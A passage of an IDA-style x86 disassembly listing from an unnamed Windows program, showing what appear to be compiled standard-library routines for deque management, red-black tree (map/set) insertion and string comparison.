loc_408DE0:                             ; CODE XREF: sub_408D80+8D↓j
                mov     eax, [esp+10h+arg_8]
                mov     ecx, ebp
                mov     edx, esi
                call    sub_401050
                test    eax, eax
                jz      short loc_408E19
                movsx   ecx, byte ptr [ebp+0]
                sub     ebx, esi
                lea     edi, [edi+ebx-1]
                push    edi
                push    ecx
                lea     ebx, [esi+1]
                push    ebx
                call    sub_40E760
                mov     esi, eax
                add     esp, 0Ch
                test    esi, esi
                jnz     short loc_408DE0

loc_408E0F:                             ; CODE XREF: sub_408D80+1F↑j
                                        ; sub_408D80+23↑j ...
                pop     edi
                pop     esi
                pop     ebx
                or      eax, 0FFFFFFFFh
                pop     ebp
                retn    0Ch
; ---------------------------------------------------------------------------

loc_408E19:                             ; CODE XREF: sub_408D80+6F↑j
                mov     edx, [esp+10h+arg_0]
                cmp     dword ptr [edx+18h], 10h
                jb      short loc_408E34
                mov     eax, [esp+10h+arg_4]
                mov     ecx, [eax]
                pop     edi
                mov     eax, esi
                pop     esi
                pop     ebx
                sub     eax, ecx
                pop     ebp
                retn    0Ch
; ---------------------------------------------------------------------------

loc_408E34:                             ; CODE XREF: sub_408D80+A1↑j
                mov     ecx, [esp+10h+arg_4]
                pop     edi
                mov     eax, esi
                pop     esi
                pop     ebx
                sub     eax, ecx
                pop     ebp
                retn    0Ch
sub_408D80      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_408E50      proc near               ; CODE XREF: sub_4086A0+8E↑p

var_4           = dword ptr -4
arg_0           = dword ptr  4
arg_4           = dword ptr  8
arg_8           = dword ptr  0Ch
arg_C           = dword ptr  10h

                sub     esp, 0Ch
                push    ebx
                push    ebp
                push    esi
                mov     esi, dword_42C8BC
                push    edi
                mov     edi, dword_42C8C0
                mov     ecx, edi
                sub     ecx, esi
                mov     eax, 2AAAAAABh
                imul    ecx
                sar     edx, 2
                mov     eax, edx
                shr     eax, 1Fh
                add     eax, edx
                jnz     short loc_408E7E
                xor     esi, esi
                jmp     short loc_408EB3
; ---------------------------------------------------------------------------

loc_408E7E:                             ; CODE XREF: sub_408E50+28↑j
                cmp     esi, edi
                jbe     short loc_408E87
                call    sub_40EC7A

loc_408E87:                             ; CODE XREF: sub_408E50+30↑j
                mov     eax, [esp+1Ch+arg_8]
                test    eax, eax
                jz      short loc_408E97
                cmp     eax, dword_42C8B0
                jz      short loc_408E9C

loc_408E97:                             ; CODE XREF: sub_408E50+3D↑j
                call    sub_40EC7A

loc_408E9C:                             ; CODE XREF: sub_408E50+45↑j
                mov     ecx, [esp+1Ch+arg_C]
                sub     ecx, esi
                mov     eax, 2AAAAAABh
                imul    ecx
                sar     edx, 2
                mov     esi, edx
                shr     esi, 1Fh
                add     esi, edx

loc_408EB3:                             ; CODE XREF: sub_408E50+2C↑j
                mov     ecx, [esp+1Ch+arg_C]
                mov     edx, [esp+1Ch+arg_8]
                mov     eax, [esp+1Ch+arg_4]
                push    ecx
                push    edx
                push    eax
                call    sub_4099D0
                mov     edi, dword_42C8BC
                cmp     edi, dword_42C8C0
                jbe     short loc_408EDA
                call    sub_40EC7A

loc_408EDA:                             ; CODE XREF: sub_408E50+83↑j
                mov     eax, dword_42C8B0
                mov     ebx, eax
                mov     ebp, ebx
                mov     [esp+1Ch+var_4], edi
                test    eax, eax
                jnz     short loc_408F05
                call    sub_40EC7A
                xor     eax, eax

loc_408EF2:                             ; CODE XREF: sub_408E50+B7↓j
                lea     ecx, [esi+esi*2]
                lea     esi, [edi+ecx*8]
                cmp     esi, [eax+10h]
                ja      short loc_408F10
                test    ebx, ebx
                jz      short loc_408F09
                mov     ebx, [ebx]
                jmp     short loc_408F0B
; ---------------------------------------------------------------------------

loc_408F05:                             ; CODE XREF: sub_408E50+99↑j
                mov     eax, [eax]
                jmp     short loc_408EF2
; ---------------------------------------------------------------------------

loc_408F09:                             ; CODE XREF: sub_408E50+AF↑j
                xor     ebx, ebx

loc_408F0B:                             ; CODE XREF: sub_408E50+B3↑j
                cmp     esi, [ebx+0Ch]
                jnb     short loc_408F15

loc_408F10:                             ; CODE XREF: sub_408E50+AB↑j
                call    sub_40EC7A

loc_408F15:                             ; CODE XREF: sub_408E50+BE↑j
                mov     eax, [esp+1Ch+arg_0]
                pop     edi
                mov     [eax+4], esi
                pop     esi
                mov     [eax], ebp
                pop     ebp
                pop     ebx
                add     esp, 0Ch
                retn    10h
sub_408E50      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_408F30      proc near               ; CODE XREF: sub_403630+144↑p
                                        ; sub_403800+92↑p ...

var_C           = dword ptr -0Ch
var_4           = dword ptr -4
arg_0           = dword ptr  4

                push    0FFFFFFFFh
                push    offset SEH_408F30
                mov     eax, large fs:0
                push    eax
                push    ecx
                push    esi
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+18h+var_C]
                mov     large fs:0, eax
                mov     eax, dword_42C8E4
                lea     ecx, [eax+1]
                mov     eax, dword_42C8DC
                cmp     eax, ecx
                ja      short loc_408F6D
                call    sub_409E20
                mov     eax, dword_42C8DC

loc_408F6D:                             ; CODE XREF: sub_408F30+31↑j
                mov     edx, dword_42C8E0
                mov     ecx, dword_42C8E4
                lea     esi, [edx+ecx]
                cmp     eax, esi
                ja      short loc_408F82
                sub     esi, eax

loc_408F82:                             ; CODE XREF: sub_408F30+4E↑j
                mov     edx, dword_42C8D8
                cmp     dword ptr [edx+esi*4], 0
                jnz     short loc_408FA1
                push    1Ch
                call    sub_40F94F
                mov     ecx, dword_42C8D8
                add     esp, 4
                mov     [ecx+esi*4], eax

loc_408FA1:                             ; CODE XREF: sub_408F30+5C↑j
                mov     edx, dword_42C8D8
                mov     ecx, [edx+esi*4]
                mov     [esp+18h+var_4], 0
                test    ecx, ecx
                jz      short loc_408FD6
                mov     eax, [esp+18h+arg_0]
                push    0FFFFFFFFh
                push    0
                mov     dword ptr [ecx+18h], 0Fh
                mov     dword ptr [ecx+14h], 0
                push    eax
                mov     byte ptr [ecx+4], 0
                call    sub_408CA0

loc_408FD6:                             ; CODE XREF: sub_408F30+84↑j
                inc     dword_42C8E4
                mov     ecx, [esp+18h+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     esi
                add     esp, 10h
                retn    4
sub_408F30      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_408FF0      proc near               ; CODE XREF: sub_41F300↓p
                mov     eax, dword_42C8E4
                push    ebx
                xor     ebx, ebx
                push    esi
                cmp     eax, ebx
                jz      short loc_409057
                lea     ecx, [ecx+0]

loc_409000:                             ; CODE XREF: sub_408FF0+5F↓j
                cmp     eax, ebx
                jz      short loc_409057
                mov     ecx, dword_42C8E0
                lea     eax, [ecx+eax-1]
                mov     ecx, dword_42C8DC
                cmp     ecx, eax
                ja      short loc_40901A
                sub     eax, ecx

loc_40901A:                             ; CODE XREF: sub_408FF0+26↑j
                mov     edx, dword_42C8D8
                mov     esi, [edx+eax*4]
                cmp     dword ptr [esi+18h], 10h
                jb      short loc_409035
                mov     eax, [esi+4]
                push    eax
                call    sub_40F15B
                add     esp, 4

loc_409035:                             ; CODE XREF: sub_408FF0+37↑j
                mov     dword ptr [esi+18h], 0Fh
                mov     [esi+14h], ebx
                mov     [esi+4], bl
                mov     eax, dword_42C8E4
                sub     eax, 1
                mov     dword_42C8E4, eax
                jnz     short loc_409000
                mov     dword_42C8E0, ebx

loc_409057:                             ; CODE XREF: sub_408FF0+B↑j
                                        ; sub_408FF0+12↑j
                mov     esi, dword_42C8DC
                mov     eax, dword_42C8D8
                cmp     esi, ebx
                jbe     short loc_409081

loc_409066:                             ; CODE XREF: sub_408FF0+8F↓j
                dec     esi
                cmp     [eax+esi*4], ebx
                jz      short loc_40907D
                mov     ecx, [eax+esi*4]
                push    ecx
                call    sub_40F15B
                mov     eax, dword_42C8D8
                add     esp, 4

loc_40907D:                             ; CODE XREF: sub_408FF0+7A↑j
                cmp     esi, ebx
                ja      short loc_409066

loc_409081:                             ; CODE XREF: sub_408FF0+74↑j
                cmp     eax, ebx
                jz      short loc_40908E
                push    eax
                call    sub_40F15B
                add     esp, 4

loc_40908E:                             ; CODE XREF: sub_408FF0+93↑j
                pop     esi
                mov     dword_42C8D8, ebx
                mov     dword_42C8DC, ebx
                pop     ebx
                retn
sub_408FF0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_4090A0      proc near               ; CODE XREF: sub_408850+91↑p

var_4           = dword ptr -4
arg_0           = dword ptr  4
arg_4           = dword ptr  8
arg_8           = dword ptr  0Ch
arg_C           = dword ptr  10h

                sub     esp, 0Ch
                push    ebx
                push    ebp
                push    esi
                mov     esi, eax
                mov     ebx, [esi+10h]
                push    edi
                mov     edi, [esi+0Ch]
                mov     ecx, ebx
                sub     ecx, edi
                mov     eax, 92492493h
                imul    ecx
                add     edx, ecx
                sar     edx, 4
                mov     eax, edx
                shr     eax, 1Fh
                add     eax, edx
                jnz     short loc_4090CC
                xor     edi, edi
                jmp     short loc_409101
; ---------------------------------------------------------------------------

loc_4090CC:                             ; CODE XREF: sub_4090A0+26↑j
                cmp     edi, ebx
                jbe     short loc_4090D5
                call    sub_40EC7A

loc_4090D5:                             ; CODE XREF: sub_4090A0+2E↑j
                mov     ecx, [esp+1Ch+arg_8]
                mov     eax, [esi]
                test    ecx, ecx
                jz      short loc_4090E3
                cmp     ecx, eax
                jz      short loc_4090E8

loc_4090E3:                             ; CODE XREF: sub_4090A0+3D↑j
                call    sub_40EC7A

loc_4090E8:                             ; CODE XREF: sub_4090A0+41↑j
                mov     ecx, [esp+1Ch+arg_C]
                sub     ecx, edi
                mov     eax, 92492493h
                imul    ecx
                add     edx, ecx
                sar     edx, 4
                mov     edi, edx
                shr     edi, 1Fh
                add     edi, edx

loc_409101:                             ; CODE XREF: sub_4090A0+2A↑j
                mov     ecx, [esp+1Ch+arg_C]
                mov     edx, [esp+1Ch+arg_8]
                mov     eax, [esp+1Ch+arg_4]
                push    ecx
                push    edx
                push    eax
                mov     ecx, esi
                call    sub_40A030
                mov     ebx, [esi+0Ch]
                cmp     ebx, [esi+10h]
                jbe     short loc_409124
                call    sub_40EC7A

loc_409124:                             ; CODE XREF: sub_4090A0+7D↑j
                mov     esi, [esi]
                mov     ebp, esi
                mov     [esp+1Ch+var_4], ebx
                test    esi, esi
                jnz     short loc_409150
                call    sub_40EC7A
                xor     eax, eax

loc_409137:                             ; CODE XREF: sub_4090A0+B2↓j
                lea     ecx, ds:0[edi*8]
                sub     ecx, edi
                lea     edi, [ebx+ecx*4]
                cmp     edi, [eax+10h]
                ja      short loc_40915B
                test    esi, esi
                jz      short loc_409154
                mov     esi, [esi]
                jmp     short loc_409156
; ---------------------------------------------------------------------------

loc_409150:                             ; CODE XREF: sub_4090A0+8E↑j
                mov     eax, [esi]
                jmp     short loc_409137
; ---------------------------------------------------------------------------

loc_409154:                             ; CODE XREF: sub_4090A0+AA↑j
                xor     esi, esi

loc_409156:                             ; CODE XREF: sub_4090A0+AE↑j
                cmp     edi, [esi+0Ch]
                jnb     short loc_409160

loc_40915B:                             ; CODE XREF: sub_4090A0+A6↑j
                call    sub_40EC7A

loc_409160:                             ; CODE XREF: sub_4090A0+B9↑j
                mov     eax, [esp+1Ch+arg_0]
                mov     [eax+4], edi
                pop     edi
                pop     esi
                mov     [eax], ebp
                pop     ebp
                pop     ebx
                add     esp, 0Ch
                retn    10h
sub_4090A0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_409180      proc near               ; CODE XREF: sub_40B290+19F↓p
                push    ecx
                cmp     esi, 9249249h
                jbe     short loc_40918E
                call    sub_40A3B0
; ---------------------------------------------------------------------------

loc_40918E:                             ; CODE XREF: sub_409180+7↑j
                mov     ecx, esi
                call    sub_409FA0
                lea     ecx, ds:0[esi*8]
                sub     ecx, esi
                lea     edx, [eax+ecx*4]
                mov     [edi+0Ch], eax
                mov     [edi+10h], eax
                mov     [edi+14h], edx
                mov     al, 1
                pop     ecx
                retn
sub_409180      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_4091B0      proc near               ; CODE XREF: sub_408740+FA↑p

var_4           = dword ptr -4

                push    ecx
                mov     eax, [esi+0Ch]
                test    eax, eax
                jz      short loc_4091D2
                mov     ecx, [esp+4+var_4]
                push    edi
                mov     edi, [esi+10h]
                push    ecx
                call    sub_40B200
                mov     edx, [esi+0Ch]
                push    edx
                call    sub_40F15B
                add     esp, 8
                pop     edi

loc_4091D2:                             ; CODE XREF: sub_4091B0+6↑j
                mov     dword ptr [esi+0Ch], 0
                mov     dword ptr [esi+10h], 0
                mov     dword ptr [esi+14h], 0
                pop     ecx
                retn
sub_4091B0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_4091F0      proc near               ; CODE XREF: sub_407940+77↑p

var_C           = dword ptr -0Ch
var_4           = dword ptr -4
arg_0           = dword ptr  4

                push    0FFFFFFFFh
                push    offset SEH_4091F0
                mov     eax, large fs:0
                push    eax
                push    esi
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+14h+var_C]
                mov     large fs:0, eax
                mov     esi, [esp+14h+arg_0]
                push    4
                call    sub_40F94F
                add     esp, 4
                test    eax, eax
                jz      short loc_409227
                mov     [eax], esi
                jmp     short loc_409229
; ---------------------------------------------------------------------------

loc_409227:                             ; CODE XREF: sub_4091F0+31↑j
                xor     eax, eax

loc_409229:                             ; CODE XREF: sub_4091F0+35↑j
                mov     [esi], eax
                mov     [esp+14h+var_4], 0
                call    sub_40AD40
                mov     [esi+18h], eax
                mov     byte ptr [eax+45h], 1
                mov     eax, [esi+18h]
                mov     [eax+4], eax
                mov     eax, [esi+18h]
                mov     [eax], eax
                mov     eax, [esi+18h]
                mov     [eax+8], eax
                mov     dword ptr [esi+1Ch], 0
                mov     eax, esi
                mov     ecx, [esp+14h+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     esi
                add     esp, 0Ch
                retn    4
sub_4091F0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_409270      proc near               ; CODE XREF: sub_407940+102↑p
                                        ; sub_409270+28↓p ...

var_4           = dword ptr -4
arg_0           = dword ptr  4

                push    ecx
                push    ebx
                push    esi
                mov     esi, [esp+0Ch+arg_0]
                xor     ebx, ebx
                push    edi
                mov     [esp+10h+var_4], ecx
                mov     edi, esi
                cmp     [esi+45h], bl
                jnz     short loc_4092E6
                push    ebp
                lea     ebp, [ebx+0Fh]
                lea     esp, [esp+0]

loc_409290:                             ; CODE XREF: sub_409270+73↓j
                mov     eax, [edi+8]
                mov     ecx, [esp+14h+var_4]
                push    eax
                call    sub_409270
                cmp     dword ptr [esi+40h], 10h
                mov     edi, [edi]
                jb      short loc_4092B1
                mov     ecx, [esi+2Ch]
                push    ecx
                call    sub_40F15B
                add     esp, 4

loc_4092B1:                             ; CODE XREF: sub_409270+33↑j
                mov     [esi+40h], ebp
                mov     [esi+3Ch], ebx
                mov     [esi+2Ch], bl
                cmp     dword ptr [esi+24h], 10h
                jb      short loc_4092CC
                mov     edx, [esi+10h]
                push    edx
                call    sub_40F15B
                add     esp, 4

loc_4092CC:                             ; CODE XREF: sub_409270+4E↑j
                mov     [esi+24h], ebp
                mov     [esi+20h], ebx
                push    esi
                mov     [esi+10h], bl
                call    sub_40F15B
                add     esp, 4
                mov     esi, edi
                cmp     [edi+45h], bl
                jz      short loc_409290
                pop     ebp

loc_4092E6:                             ; CODE XREF: sub_409270+13↑j
                pop     edi
                pop     esi
                pop     ebx
                pop     ecx
                retn    4
sub_409270      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_4092F0      proc near               ; CODE XREF: sub_4088F0+162↑p

var_50          = byte ptr -50h
var_4C          = byte ptr -4Ch
var_3C          = dword ptr -3Ch
var_38          = dword ptr -38h
var_34          = dword ptr -34h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4
arg_0           = dword ptr  4
arg_4           = dword ptr  8
arg_8           = byte ptr  0Ch
arg_C           = dword ptr  10h

                push    0FFFFFFFFh
                push    offset SEH_40AA20
                mov     eax, large fs:0
                push    eax
                sub     esp, 44h
                push    ebx
                push    ebp
                push    esi
                push    edi
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+64h+var_C]
                mov     large fs:0, eax
                mov     esi, ecx
                mov     ebp, [esp+64h+arg_0]
                cmp     dword ptr [ebp+1Ch], 4924923h
                jb      short loc_409371
                push    13h
                xor     ebx, ebx
                push    offset aMapSetTTooLong ; "map/set<T> too long"
                lea     ecx, [esp+6Ch+var_50]
                mov     [esp+6Ch+var_38], 0Fh
                mov     [esp+6Ch+var_3C], ebx
                mov     [esp+6Ch+var_4C], bl
                call    sub_409840
                lea     eax, [esp+64h+var_50]
                push    eax
                lea     ecx, [esp+68h+var_34]
                mov     [esp+68h+var_4], ebx
                call    sub_4010D0
                push    offset unk_423344
                lea     ecx, [esp+68h+var_34]
                push    ecx
                mov     [esp+6Ch+var_34], offset off_420278
                call    sub_41032B

loc_409371:                             ; CODE XREF: sub_4092F0+34↑j
                mov     edx, [esp+64h+arg_C]
                mov     eax, [ebp+18h]
                push    edx
                push    eax
                push    esi
                push    eax
                call    sub_40A730
                mov     ecx, [ebp+18h]
                mov     edx, eax
                mov     eax, 1
                add     [ebp+1Ch], eax
                xor     ebx, ebx
                mov     [esp+64h+arg_0], edx
                cmp     esi, ecx
                jnz     short loc_4093A5
                mov     [ecx+4], edx
                mov     ecx, [ebp+18h]
                mov     [ecx], edx
                mov     ecx, [ebp+18h]
                jmp     short loc_4093C3
; ---------------------------------------------------------------------------

loc_4093A5:                             ; CODE XREF: sub_4092F0+A6↑j
                cmp     [esp+64h+arg_8], bl
                jz      short loc_4093B8
                mov     [esi], edx
                mov     ecx, [ebp+18h]
                cmp     esi, [ecx]
                jnz     short loc_4093C6
                mov     [ecx], edx
                jmp     short loc_4093C6
; ---------------------------------------------------------------------------

loc_4093B8:                             ; CODE XREF: sub_4092F0+B9↑j
                mov     [esi+8], edx
                mov     ecx, [ebp+18h]
                cmp     esi, [ecx+8]
                jnz     short loc_4093C6

loc_4093C3:                             ; CODE XREF: sub_4092F0+B3↑j
                mov     [ecx+8], edx

loc_4093C6:                             ; CODE XREF: sub_4092F0+C2↑j
                                        ; sub_4092F0+C6↑j ...
                mov     esi, [edx+4]
                lea     ecx, [edx+4]
                cmp     [esi+44h], bl
                jnz     loc_409547

loc_4093D5:                             ; CODE XREF: sub_4092F0+24D↓j
                mov     esi, [ecx]
                mov     edi, [esi+4]
                cmp     esi, [edi]
                jnz     loc_409488
                mov     edi, [edi+8]
                cmp     [edi+44h], bl
                jz      loc_40948F
                cmp     edx, [esi+8]
                jnz     short loc_40942E
                mov     edx, esi
                mov     esi, [edx+8]
                mov     ecx, [esi]
                mov     [edx+8], ecx
                mov     ecx, [esi]
                cmp     [ecx+45h], bl
                jnz     short loc_409407
                mov     [ecx+4], edx

loc_409407:                             ; CODE XREF: sub_4092F0+112↑j
                mov     edi, [edx+4]
                lea     ecx, [edx+4]
                mov     [esi+4], edi
                mov     edi, [ebp+18h]
                cmp     edx, [edi+4]
                jnz     short loc_40941D
                mov     [edi+4], esi
                jmp     short loc_40942A
; ---------------------------------------------------------------------------

loc_40941D:                             ; CODE XREF: sub_4092F0+126↑j
                mov     edi, [ecx]
                cmp     edx, [edi]
                jnz     short loc_409427
                mov     [edi], esi
                jmp     short loc_40942A
; ---------------------------------------------------------------------------

loc_409427:                             ; CODE XREF: sub_4092F0+131↑j
                mov     [edi+8], esi

loc_40942A:                             ; CODE XREF: sub_4092F0+12B↑j
                                        ; sub_4092F0+135↑j
                mov     [esi], edx
                mov     [ecx], esi

loc_40942E:                             ; CODE XREF: sub_4092F0+101↑j
                mov     esi, [ecx]
                mov     [esi+44h], al
                mov     esi, [ecx]
                mov     esi, [esi+4]
                mov     [esi+44h], bl
                mov     ecx, [ecx]
                mov     ecx, [ecx+4]
                mov     esi, [ecx]
                mov     edi, [esi+8]
                mov     [ecx], edi
                mov     edi, [esi+8]
                cmp     [edi+45h], bl
                jnz     short loc_409452
                mov     [edi+4], ecx

loc_409452:                             ; CODE XREF: sub_4092F0+15D↑j
                mov     edi, [ecx+4]
                mov     [esi+4], edi
                mov     edi, [ebp+18h]
                cmp     ecx, [edi+4]
                jnz     short loc_40946B
                mov     [edi+4], esi
                mov     [esi+8], ecx
                jmp     loc_409531
; ---------------------------------------------------------------------------

loc_40946B:                             ; CODE XREF: sub_4092F0+16E↑j
                mov     edi, [ecx+4]
                cmp     ecx, [edi+8]
                jnz     short loc_40947E
                mov     [edi+8], esi
                mov     [esi+8], ecx
                jmp     loc_409531
; ---------------------------------------------------------------------------

loc_40947E:                             ; CODE XREF: sub_4092F0+181↑j
                mov     [edi], esi
                mov     [esi+8], ecx
                jmp     loc_409531
; ---------------------------------------------------------------------------

loc_409488:                             ; CODE XREF: sub_4092F0+EC↑j
                mov     edi, [edi]
                cmp     [edi+44h], bl
                jnz     short loc_4094A9

loc_40948F:                             ; CODE XREF: sub_4092F0+F8↑j
                mov     edx, esi
                mov     [edx+44h], al
                mov     [edi+44h], al
                mov     edx, [ecx]
                mov     edx, [edx+4]
                mov     [edx+44h], bl
                mov     ecx, [ecx]
                mov     edx, [ecx+4]
                jmp     loc_409534
; ---------------------------------------------------------------------------

loc_4094A9:                             ; CODE XREF: sub_4092F0+19D↑j
                cmp     edx, [esi]
                jnz     short loc_4094EA
                mov     edx, esi
                mov     esi, [edx]
                mov     ecx, [esi+8]
                mov     [edx], ecx
                mov     ecx, [esi+8]
                cmp     [ecx+45h], bl
                jnz     short loc_4094C1
                mov     [ecx+4], edx

loc_4094C1:                             ; CODE XREF: sub_4092F0+1CC↑j
                mov     edi, [edx+4]
                lea     ecx, [edx+4]
                mov     [esi+4], edi
                mov     edi, [ebp+18h]
                cmp     edx, [edi+4]
                jnz     short loc_4094D7
                mov     [edi+4], esi
                jmp     short loc_4094E5
; ---------------------------------------------------------------------------

loc_4094D7:                             ; CODE XREF: sub_4092F0+1E0↑j
                mov     edi, [ecx]
                cmp     edx, [edi+8]
                jnz     short loc_4094E3
                mov     [edi+8], esi
                jmp     short loc_4094E5
; ---------------------------------------------------------------------------

loc_4094E3:                             ; CODE XREF: sub_4092F0+1EC↑j
                mov     [edi], esi

loc_4094E5:                             ; CODE XREF: sub_4092F0+1E5↑j
                                        ; sub_4092F0+1F1↑j
                mov     [esi+8], edx
                mov     [ecx], esi

loc_4094EA:                             ; CODE XREF: sub_4092F0+1BB↑j
                mov     esi, [ecx]
                mov     [esi+44h], al
                mov     esi, [ecx]
                mov     esi, [esi+4]
                mov     [esi+44h], bl
                mov     ecx, [ecx]
                mov     ecx, [ecx+4]
                mov     esi, [ecx+8]
                mov     edi, [esi]
                mov     [ecx+8], edi
                mov     edi, [esi]
                cmp     [edi+45h], bl
                jnz     short loc_40950E
                mov     [edi+4], ecx

loc_40950E:                             ; CODE XREF: sub_4092F0+219↑j
                mov     edi, [ecx+4]
                mov     [esi+4], edi
                mov     edi, [ebp+18h]
                cmp     ecx, [edi+4]
                jnz     short loc_409521
                mov     [edi+4], esi
                jmp     short loc_40952F
; ---------------------------------------------------------------------------

loc_409521:                             ; CODE XREF: sub_4092F0+22A↑j
                mov     edi, [ecx+4]
                cmp     ecx, [edi]
                jnz     short loc_40952C
                mov     [edi], esi
                jmp     short loc_40952F
; ---------------------------------------------------------------------------

loc_40952C:                             ; CODE XREF: sub_4092F0+236↑j
                mov     [edi+8], esi

loc_40952F:                             ; CODE XREF: sub_4092F0+22F↑j
                                        ; sub_4092F0+23A↑j
                mov     [esi], ecx

loc_409531:                             ; CODE XREF: sub_4092F0+176↑j
                                        ; sub_4092F0+189↑j ...
                mov     [ecx+4], esi

loc_409534:                             ; CODE XREF: sub_4092F0+1B4↑j
                mov     esi, [edx+4]
                lea     ecx, [edx+4]
                cmp     [esi+44h], bl
                jz      loc_4093D5
                mov     edx, [esp+64h+arg_0]

loc_409547:                             ; CODE XREF: sub_4092F0+DF↑j
                mov     ecx, [ebp+18h]
                mov     ecx, [ecx+4]
                mov     [ecx+44h], al
                mov     ecx, [esp+64h+arg_4]
                mov     [ecx+4], edx
                mov     edx, [ebp+0]
                mov     [ecx], edx
                mov     eax, ecx
                mov     ecx, [esp+64h+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebp
                pop     ebx
                add     esp, 50h
                retn    10h
sub_4092F0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame fuzzy-sp

sub_409580      proc near               ; CODE XREF: sub_407940+DD↑p
                                        ; sub_4084B0+2E↑p

var_8           = byte ptr -8

                push    ebp
                mov     ebp, esp
                and     esp, 0FFFFFFF8h
                mov     eax, [esi+18h]
                mov     ecx, [esi]
                mov     edx, [eax]
                sub     esp, 8
                push    eax
                push    ecx
                push    edx
                push    ecx
                lea     eax, [esp+18h+var_8]
                push    eax
                mov     eax, esi
                call    sub_40A430
                mov     ecx, [esi+18h]
                push    ecx
                call    sub_40F15B
                add     esp, 4
                xor     eax, eax
                mov     [esi+18h], eax
                mov     [esi+1Ch], eax
                mov     esp, ebp
                pop     ebp
                retn
sub_409580      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_4095C0      proc near               ; CODE XREF: sub_4088F0+199↑p
                                        ; sub_408AC0+41↑p
                cmp     dword ptr [eax+18h], 10h
                push    esi
                push    edi
                mov     edi, [eax+14h]
                jb      short loc_4095D0
                mov     ecx, [eax+4]
                jmp     short loc_4095D3
; ---------------------------------------------------------------------------

loc_4095D0:                             ; CODE XREF: sub_4095C0+9↑j
                lea     ecx, [eax+4]

loc_4095D3:                             ; CODE XREF: sub_4095C0+E↑j
                mov     esi, [edx+14h]
                mov     eax, esi
                cmp     esi, edi
                jb      short loc_4095DE
                mov     eax, edi

loc_4095DE:                             ; CODE XREF: sub_4095C0+1A↑j
                cmp     dword ptr [edx+18h], 10h
                jb      short loc_4095E9
                mov     edx, [edx+4]
                jmp     short loc_4095EC
; ---------------------------------------------------------------------------

loc_4095E9:                             ; CODE XREF: sub_4095C0+22↑j
                add     edx, 4

loc_4095EC:                             ; CODE XREF: sub_4095C0+27↑j
                call    sub_401050
                test    eax, eax
                jnz     short loc_40960F
                cmp     esi, edi
                jnb     short loc_409608
                or      eax, 0FFFFFFFFh
                xor     ecx, ecx
                test    eax, eax
                setl    cl
                pop     edi
                mov     al, cl
                pop     esi
                retn
; ---------------------------------------------------------------------------

loc_409608:                             ; CODE XREF: sub_4095C0+37↑j
                xor     eax, eax
                cmp     esi, edi
                setnz   al

loc_40960F:                             ; CODE XREF: sub_4095C0+33↑j
                xor     ecx, ecx
                test    eax, eax
                setl    cl
                pop     edi
                mov     al, cl
                pop     esi
                retn
sub_4095C0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_409620      proc near               ; DATA XREF: .rdata:00423330↓o

arg_0           = dword ptr  4

                mov     eax, [esp+arg_0]
                push    esi
                push    eax
                mov     esi, ecx
                call    sub_401240
                mov     dword ptr [esi], offset off_420278
                mov     eax, esi
                pop     esi
                retn    4
sub_409620      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_409640      proc near               ; CODE XREF: sub_4027B0+FD↑p
                                        ; sub_409730+48↓p

arg_0           = dword ptr  4
arg_4           = dword ptr  8

                push    ebx
                push    ebp
                mov     ebp, [esp+8+arg_0]
                push    edi
                mov     edi, [esp+0Ch+arg_4]
                mov     ebx, eax
                cmp     [ebp+14h], edi
                jnb     short loc_409657
                call    sub_40E2A3
; ---------------------------------------------------------------------------

loc_409657:                             ; CODE XREF: sub_409640+10↑j
                mov     eax, [ebp+14h]
                sub     eax, edi
                cmp     eax, ebx
                jnb     short loc_409662
                mov     ebx, eax

loc_409662:                             ; CODE XREF: sub_409640+1E↑j
                mov     eax, [esi+14h]
                or      ecx, 0FFFFFFFFh
                sub     ecx, eax
                cmp     ecx, ebx
                jbe     short loc_409675
                lea     edx, [eax+ebx]
                cmp     edx, eax
                jnb     short loc_40967A

loc_409675:                             ; CODE XREF: sub_409640+2C↑j
                call    sub_40E26B
; ---------------------------------------------------------------------------

loc_40967A:                             ; CODE XREF: sub_409640+33↑j
                test    ebx, ebx
                jbe     loc_409726
                mov     edi, [esi+14h]
                add     edi, ebx
                cmp     edi, 0FFFFFFFEh
                jbe     short loc_409691
                call    sub_40E26B
; ---------------------------------------------------------------------------

loc_409691:                             ; CODE XREF: sub_409640+4A↑j
                mov     eax, [esi+18h]
                cmp     eax, edi
                jnb     short loc_4096B3
                mov     eax, [esi+14h]
                push    eax
                push    edi
                mov     ecx, esi
                call    sub_40A7D0
                test    edi, edi

loc_4096A6:                             ; CODE XREF: sub_409640+75↓j
                jbe     short loc_409726
                cmp     dword ptr [ebp+18h], 10h
                jb      short loc_4096DB
                mov     ebp, [ebp+4]
                jmp     short loc_4096DE
; ---------------------------------------------------------------------------

loc_4096B3:                             ; CODE XREF: sub_409640+56↑j
                test    edi, edi
                jnz     short loc_4096A6
                mov     [esi+14h], edi
                cmp     eax, 10h
                jb      short loc_4096CD
                mov     eax, [esi+4]
                pop     edi
                pop     ebp
                mov     byte ptr [eax], 0
                mov     eax, esi
                pop     ebx
                retn    8
; ---------------------------------------------------------------------------

